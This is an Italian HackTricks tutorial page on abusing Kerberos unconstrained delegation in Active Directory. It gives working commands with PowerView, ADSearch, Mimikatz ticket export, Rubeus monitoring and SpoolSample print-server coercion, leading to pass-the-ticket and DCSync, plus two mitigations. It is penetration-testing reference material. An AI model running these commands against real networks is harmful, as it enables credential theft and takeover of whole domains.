# Delega non vincolata

Questa è una funzionalità che un amministratore di dominio può impostare su qualsiasi **computer** all'interno del dominio. Ogni volta che un **utente effettua l'accesso** al computer, una **copia del TGT** di quell'utente verrà **inviata all'interno del TGS** fornito dal DC **e salvata in memoria in LSASS**. Quindi, se si dispone dei privilegi di amministratore sulla macchina, sarà possibile **scaricare i biglietti e impersonare gli utenti** su qualsiasi macchina.

Quindi, se un amministratore di dominio accede a un computer con la funzionalità "Delega non vincolata" attivata e si dispone dei privilegi di amministratore locale su quella macchina, sarà possibile scaricare il biglietto e impersonare l'amministratore di dominio ovunque (elevazione dei privilegi di dominio).

È possibile **trovare oggetti Computer con questo attributo** verificando se l'attributo [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) contiene [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). È possibile farlo con un filtro LDAP di '(userAccountControl:1.2.840.113556.1.4.803:=524288)', che è ciò che fa powerview:

```bash
# Elenco dei computer non vincolati
## Powerview
Get-NetComputer -Unconstrained # I DC appaiono sempre ma non sono utili per l'elevazione dei privilegi
## ADSearch
ADSearch.exe --search "(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
# Esporta i biglietti con Mimikatz
privilege::debug
sekurlsa::tickets /export # Modo consigliato
kerberos::list /export # Altro modo

# Monitora gli accessi e esporta nuovi biglietti
.\Rubeus.exe monitor /targetuser:&lt;username> /interval:10 # Controlla ogni 10 secondi i nuovi TGT
```

Carica il biglietto dell'amministratore (o dell'utente vittima) in memoria con **Mimikatz** o **Rubeus per un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Ulteriori informazioni: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Ulteriori informazioni sulla delega non vincolata in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forza l'autenticazione**

Se un attaccante è in grado di **compromettere un computer autorizzato per la "Delega non vincolata"**, potrebbe **ingannare** un **server di stampa** per **effettuare automaticamente l'accesso** ad esso **salvando un TGT** nella memoria del server.\
Successivamente, l'attaccante potrebbe eseguire un attacco **Pass the Ticket per impersonare** l'account del computer del server di stampa.

Per fare in modo che un server di stampa effettui l'accesso a qualsiasi macchina, è possibile utilizzare [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se il TGT proviene da un controller di dominio, è possibile eseguire un attacco [**DCSync**](acl-persistence-abuse/#dcsync) e ottenere tutti gli hash dal DC.\
[**Ulteriori informazioni su questo attacco su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Ecco altri modi per cercare di forzare un'autenticazione:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigazione

* Limitare i login DA/Admin a servizi specifici
* Impostare "Account sensibile e non può essere delegato" per gli account privilegiati.

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in un'azienda di **sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al repository [hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
